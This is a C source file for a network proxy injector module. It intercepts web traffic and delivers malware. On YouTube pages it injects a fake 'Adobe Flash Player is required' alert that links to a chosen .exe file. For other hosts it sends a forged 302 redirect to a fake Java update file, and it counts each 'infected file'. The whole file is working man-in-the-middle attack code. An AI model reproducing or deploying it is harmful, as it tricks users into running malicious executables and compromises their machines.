/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_replace.c 3560 2011-06-07 15:00:02Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <signal.h>
#include <bio_replacer.h>
#include <bio_injector.h>

/* globals */


/* protos */

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file, char *tag, char *host);

/************************************************/

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host)
{
   int written, len;
   BIO *fbio = NULL;
   char http_header[HTTP_HEADER_LEN];
   char ipa_url[MAX_URL];


   if(strstr(host, "youtube"))
   {
      char *data;
      struct bio_inject_setup bis;
      int inject_len = 0;


      *sbio = BIO_new(BIO_s_connect());
      BIO_set_conn_hostname(*sbio, host);
      BIO_set_conn_port(*sbio, "http");

      if (BIO_do_connect(*sbio) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot connect to [%s]", host);
         return -ENOADDRESS;
      }

      DEBUG_MSG(D_INFO, "Connection html to [%s]", host);
      sanitize_header(http_header);

      DEBUG_MSG(D_EXCESSIVE, "header: [%s]", http_header);

      BIO_puts(*sbio, http_header);

      written = 0;
      SAFE_CALLOC(data, READ_BUFF_SIZE, sizeof(char));

      LOOP {
         len = BIO_read(*sbio, data + written, sizeof(char));
         if (len <= 0)
            break;

         written += len;
         if (strstr(data, CR LF CR LF) || strstr(data, LF LF))
            break;
      }

      if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
      
         char *html_to_inject1 = "document.getElementById('watch-player').innerHTML = \"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
         char *html_to_inject2 = "'>Get the latest Flash Player</a> <br></div></div></div>\";";
         char *html_to_inject;
         int html_to_inject_len = 0;


         html_to_inject_len = strlen(html_to_inject1) + strlen(file) + strlen(".exe") + strlen(html_to_inject2);
         SAFE_CALLOC(html_to_inject, html_to_inject_len, sizeof(char));

         strcpy(html_to_inject, html_to_inject1);
         strcat(html_to_inject, file);
         strcat(html_to_inject, ".exe");
         strcat(html_to_inject, html_to_inject2);

         fbio = BIO_new(BIO_f_inject());
         bis.search = "'watch-player').innerHTML = swf;";
         bis.inject = html_to_inject;
         bis.inject_len = html_to_inject_len;

         BIO_ctrl(fbio, BIO_C_SET_BUF_MEM, 1, &bis);
         BIO_ctrl(fbio, BIO_C_GET_BUF_MEM_PTR, 1, &bis);

         inject_len = bis.inject_len;
         GBL_STATS->inf_files++;
      }else{

         DEBUG_MSG(D_INFO, "Server [%s] reply is not HTTP 200 OK", host);
         DEBUG_MSG(D_DEBUG, "Server reply is:\n%s", data);

         fbio = BIO_new(BIO_f_null());
         inject_len = 0;
      }
   } else {
      /* calculate and replace the IPA_URL in the file */
      snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);

      DEBUG_MSG(D_INFO, "Tag: %s, sending fake upgrade redirect [%s/%s] ", tag, file, "java-map-update.xml");
      snprintf(http_header, HTTP_HEADER_LEN, "HTTP/1.0 302 Found\r\n"
         "Location: %s/java-map-update-%s.xml\r\n"
         "Content-Type: text/html\r\n"
         "Connection: close\r\n"
         "\r\n", ipa_url, file);

      BIO_write(*cbio, http_header, strlen(http_header));
   }

   GBL_STATS->inf_files++;
   return ESUCCESS;
}

/* EOF */

// vim:ts=3:expandtab
